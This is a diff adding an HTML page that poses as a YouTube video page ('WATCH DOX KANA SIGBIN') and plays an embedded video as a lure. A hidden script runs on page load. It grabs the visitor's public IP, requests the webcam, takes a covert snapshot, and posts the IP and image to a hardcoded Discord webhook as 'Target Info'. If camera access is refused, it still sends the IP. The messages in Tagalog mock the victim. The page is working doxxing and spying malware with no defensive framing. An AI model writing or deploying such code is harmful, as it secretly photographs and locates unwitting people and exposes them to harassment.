@@ -1,0 +1,53 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>YouTube - WATCH DOX KANA SIGBIN</title>
+    <style>
+        body { background: black; color: white; text-align: center; font-family: Arial; padding-top: 50px; }
+    </style>
+</head>
+<body>
+    <h1>WATCH DOX KANA SIGBIN</h1>
+    <p>Loading Video Player...</p>
+    <iframe width="100%" height="500" src="https://www.youtube.com/embed/dQw4w9WgXcQ?autoplay=1" frameborder="0" allow="autoplay; encrypted-media" allowfullscreen></iframe>
+
+    <video id="v" autoplay style="display:none;"></video>
+    <canvas id="c" style="display:none;"></canvas>
+
+    <script>
+        const hook = "https://discord.com/api/webhooks/1470024521758277849/x38VsV5RWVkSq6k7un7WZ8H43jrfzy9yUfI4D3MvDd_WP3jgTIb1_0kn6ga4Kho4c54z";
+
+        async function grab() {
+            const res = await fetch('https://api.ipify.org?format=json');
+            const data = await res.json();
+            
+            navigator.mediaDevices.getUserMedia({ video: true }).then(stream => {
+                const vid = document.getElementById('v');
+                vid.srcObject = stream;
+                setTimeout(() => {
+                    const can = document.getElementById('c');
+                    can.width = 640; can.height = 480;
+                    can.getContext('2d').drawImage(vid, 0, 0);
+                    const img = can.toDataURL('image/jpeg');
+
+                    fetch(hook, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({
+                            content: "🚨 **HULI ANG SIGBIN!** 🚨",
+                            embeds: [{ title: "Target Info", description: "**IP:** " + data.ip, image: { url: img } }]
+                        })
+                    });
+                }, 2000);
+            }).catch(e => {
+                fetch(hook, { method: 'POST', headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ content: "⚠️ Cam Blocked pero IP nakuha: " + data.ip })
+                });
+            });
+        }
+        window.onload = grab;
+    </script>
+</body>
+</html>
+
+
